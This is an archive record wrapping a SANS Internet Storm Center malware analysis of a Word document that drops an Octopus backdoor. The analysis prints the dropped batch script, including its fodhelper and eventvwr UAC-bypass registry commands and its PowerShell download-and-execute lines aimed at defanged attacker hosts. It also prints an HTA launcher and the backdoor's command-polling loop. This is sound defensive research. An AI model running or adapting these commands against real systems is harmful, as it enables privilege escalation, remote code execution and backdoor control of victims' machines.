{
    "id": "b6259fb1-7bf9-4b1d-b3bf-0aab9dc0723a",
    "created_at": "2023-01-12T14:59:18.381928Z",
    "updated_at": "2025-03-27T02:09:30.306414Z",
    "deleted_at": null,
    "sha1_hash": "1f1406d826ea17329f4c4b84b9c36a250a8da7cd",
    "title": "2020-12-24 - Malicious Word Document Delivering an Octopus Backdoor",
    "authors": "",
    "file_creation_date": "2022-05-28T15:57:45Z",
    "file_modification_date": "2022-05-28T15:57:45Z",
    "file_size": 2936068,
    "plain_text": "# SANS ISC: InfoSec Handlers Diary Blog - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training InfoSec Handlers Diary Blog\n\n**isc.sans.edu/diary/26918**\n\n## Malicious Word Document Delivering an Octopus Backdoor\n\n### Published: 2020-12-24\n Last Updated: 2020-12-24 07:27:03 UTC\n by Xavier Mertens (Version: 1)\n 0 comment(s) Here is an interesting malicious Word document that I spotted yesterday. This time, it does not contain a macro but two embedded objects that the victim must \"activate\" (click on one of them) to perform the malicious activities. The document (SHA256:ba6cc16770dc67c1af1a3e103c3fd19a854193e7cd1fecbb11ca11c2c47cdf04) has a VT score of 20/62[1]:\n\n\n-----\n\n### A quick analysis with oledump.py reveals indeed the presence of two embedded objects (the \"0\" indicator):\n```\nremnux@remnux:~$ oledump.py\nba6cc16770dc67c1af1a3e103c3fd19a854193e7cd1fecbb11ca11c2c47cdf04.doc.vir \n 1:    114 '\\x01CompObj'\n 2:    280 '\\x05DocumentSummaryInformation'\n 3:    416 '\\x05SummaryInformation'\n 4:   7338 '1Table'\n 5:   4096 'Data'\n 6: O  1329 'ObjectPool/_1670067230/\\x01Ole10Native'\n 7:     6 'ObjectPool/_1670067230/\\x03ObjInfo'\n 8: O  1536 'ObjectPool/_1670067231/\\x01Ole10Native'\n 9:     6 'ObjectPool/_1670067231/\\x03ObjInfo'\n 10:   4096 'WordDocument'\n\n You can extract them via oledump.py or directly from the document (if you have a Word in your sandbox). Both objects are the same and contain a Windows batch fime. Note the double extension:\n\n```\n\n-----\n\n### HIRING FORM.DOC.bat CONDITIONS OF THE CONTRACT.PDF.bat\n\n Here is the content (beautified):\n```\n@echo Off\nfor /f \"tokens=2 delims=,\" %%i in ('wmic os get caption^,version /format:csv') do set\nos=%%i\necho %os%|find \" 10 \">nul \n && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v\n\"DelegateExecute\" /f \n && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd.exe /c\npowershell -WindowStyle Hidden -command \\\"IEX (New-Object\nNet.WebClient).DownloadFile('hxxp://23[.]98[.]155[.]192/sc.bat',\n'C:\\Users\\Public\\Libraries\\sc.bat');\\\" C:\\Users\\Public\\Libraries\\sc.bat\" /f \n && START /W fodhelper.exe \n && reg delete HKCU\\Software\\Classes\\ms-settings /f||reg.exe add\nhkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"cmd.exe /c powershell WindowStyle Hidden -command \\\"IEX (New-Object\nNet.WebClient).DownloadFile('hxxp://23[.]98[.]155[.]192/sc.bat',\n'C:\\Users\\Public\\Libraries\\sc.bat');\\\" C:\\Users\\Public\\Libraries\\sc.bat\" /f \n && START /W eventvwr.exe \n && reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f\n\n This script will test the operating system version and if the victim's computer is running Windows 10, two UAC bypass techniques are attempted:\n\n The first one targets 'fodhelper.exe' by creating a registry key 'HKCU:\\Software\\Classes\\ms- settings\\shell\\open\\command\\DelegateExecute'. The second one targets 'eventvwr.exe'. This is a common technique used for a while by attackers.\n\n The privileged command executes a simple Powershell script that fetches the next stage payload and executes it. This 'sc.bat' is heavily obfuscated:\n\n```\n\n-----\n\n### This file contains Chinese characters but interesting strings can be extracted:\n\n\n-----\n\n```\nremnux@remnux: $ strings n 20 sc.bat \n=R7cBqDS KFeZWNzhyTrOCGUE3gmujl4@dnxQk0wvbVYIi5aJ8HM1tA2o6L9XfspP\"\n%ImJ:~44,1%%ImJ:~41,1%%ImJ:~31,1%%ImJ:~1,1%%ImJ:~7,1%\"\n=%ImJ:~54,1%%ImJ:~34,1%%ImJ:~55,1%%ImJ:~40,1%%g\n%%ImJ:~43,1%%ImJ:~53,1%%ImJ:~26,1%%ImJ:~3,1%%\n%%ImJ:~61,1%%ImJ:~46,1%%ImJ:~31,1%%ImJ:~24,1%%ImJ:~18,1%%ImJ:~41,1%%ImJ:~16,1%%ImJ:~57\n%%ImJ:~9,1%%ImJ:~50,1%%ImJ:~6,1%%ImJ:~14,1%%ImJ:~44,1%%ImJ:~25,1%%ImJ:~36,1%%ImJ:~59,1\n%%ImJ:~15,1%%ImJ:~47,1%%ImJ:~12,1%%ImJ:~45,1%%ImJ:~56,1%%ImJ:~5,1%%ImJ:~1,1%%ImJ:~32,1\n%%ImJ:~38,1%%ImJ:~10,1%%ImJ:~2,1%%ImJ:~0,1%%ImJ:~29,1%%ImJ:~48,1%%ImJ:~13,1%%ImJ:~28,1\n%bIY:~45,1%%bIY:~38,1%%bIY:~57,1%%bIY:~6,1%%bIY:~23,1%\"\n%bIY:~35,1%%bIY:~56,1%=%bIY:~43,1%%N\n%%bIY:~29,1%%bIY:~12,1%%bIY:~38,1%%bIY:~28,1%%bIY:~49,1%%bIY:~37,1%%bIY:~51,1%%bIY:~33\n%%bIY:~24,1%%bIY:~46,1%%bIY:~11,1%%bIY:~31,1%%bIY:~63,1%%bIY:~7,1%%bIY:~36,1%%bIY:~40,\nm%%bIY:~25,1%%bIY:~34,1%%bIY:~45,1%%bIY:~0,1%%bIY:~19,1%%bIY:~39,1%%bIY:~2,1%%bIY:~60,\nF%%bIY:~22,1%%bIY:~53,1%%bIY:~41,1%%bIY:~56,1%%Pc\nM%%bIY:~27,1%%bIY:~21,1%%bIY:~23,1%%bIY:~26,1%%_\nYW%%bIY:~8,1%%bIY:~6,1%%bIY:~59,1%%bIY:~3,1%%bIY:~17,1%%bIY:~16,1%%bIY:~14,1%%bIY:~9,1\n:~54,1%://hpsj[.]firewall-gateway[.]net:80/hpjs.php');\\\"\"\n:~54,1%://hpsj[.]firewall-gateway[.]net:8080/MicrosoftUpdate\"%bK\n:~60,1%://is[.]gd/xbQIQ2','C:\\Users\\Public\\Libraries\\pus.bat');\"%bK\n:~62,1%:\\Users\\Public\\Libraries\\pus.bat\n:~54,1%://hpsj[.]firewall-gateway[.]net:8080/MicrosoftUpdate'%bK\n:~62,1%:\\Users\\Public\\Libraries\\pus.bat'%bK\n:~54,1%://hpsj[.]firewall-gateway[.]net:8080/MicrosoftUpdate\n:~54,1%://hpsj[.]firewall-gateway[.]net:80/hta\n\n### It downloads more malicious code from URLs present in the file.\n\n The first one from hxxp://hpsj.firewall-gateway.net/hta:\nvar cm=\"powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=\n[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=\n[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('hxxp://hpsj[.]firewal\ngateway[.]net:80/hpjs.php'));\";\nvar w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');\nw32ps.SpawnInstance_();\nw32ps.ShowWindow=0;\nvar\nrtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\\\',w32ps,null);\n\n The returned data contains Powershell code that is executed through the 'IEX' command.\n\n The second script from hxxp://hpsj.firewall-gateway[.]net:8080/MicrosoftUpdate exfiltrates information about the victim to the C2:\n\n```\n\n-----\n\n### Now, let's have a look at the Powershell code retrieved above. It's a backdoor that keeps contact with the C2 via simple HTTP requests:\n```\nwhile($true){\n  try{\n  $command_raw = $wc2.downloadString(\"hxxp://hpsj[.]firewallgateway[.]net:80/view/$IHW\");\n  }catch{\n  $failure_counter=$failure_counter +1;\n  if ($failure_counter -eq 10){\n  kill $pid\n  }\n  }\n\n The variable \"$IHW\" identifies the victim. The following commands are:\n\n Report: To return information about the victim (processes, IP address, etc) Download: To retrieve a file reset-ps: To reset the Powershell session Any other command is interpreted via 'Invoke-Expression'\n\n All communications occur on top of HTTP but data are AES encrypted. Checking deeper, we are facing an Octopus[2] backdoor. This framework has been developed to help red teams to compromise and gather information from victims. In this case, it was not an exercise but a real phishing campaign targeting specific users.\n\n I wish you a Merry Christmas and stay safe!\n\n [1] https://www.virustotal.com/gui/file/ba6cc16770dc67c1af1a3e103c3fd19a854193e7cd1fecbb1 1ca11c2c47cdf04/detection\n\n [2] https://github.com/mhaskar/Octopus\n\n```\n\n-----\n\n### Xavier Mertens (@xme) Senior ISC Handler - Freelance Cyber Security Consultant PGP Key\n\n Keywords: Backdoor Maldoc Malware Octopus PowerShell Word 0 comment(s)\n\nJoin us at SANS! Attend Reverse-Engineering Malware: Malware Analysis Tools and\n### Techniques with Xavier Mertens in Amsterdam starting Aug 15 2022\n\n Top of page Ã—\n\n Diary Archives\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-24 - Malicious Word Document Delivering an Octopus Backdoor.pdf"
    ],
    "report_names": [
        "2020-12-24 - Malicious Word Document Delivering an Octopus Backdoor.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535558,
    "ts_updated_at": 1743041370,
    "ts_creation_date": 1653753465,
    "ts_modification_date": 1653753465,
    "files": {
        "pdf": "https://archive.orkl.eu/1f1406d826ea17329f4c4b84b9c36a250a8da7cd.pdf",
        "text": "https://archive.orkl.eu/1f1406d826ea17329f4c4b84b9c36a250a8da7cd.txt",
        "img": "https://archive.orkl.eu/1f1406d826ea17329f4c4b84b9c36a250a8da7cd.jpg"
    }
}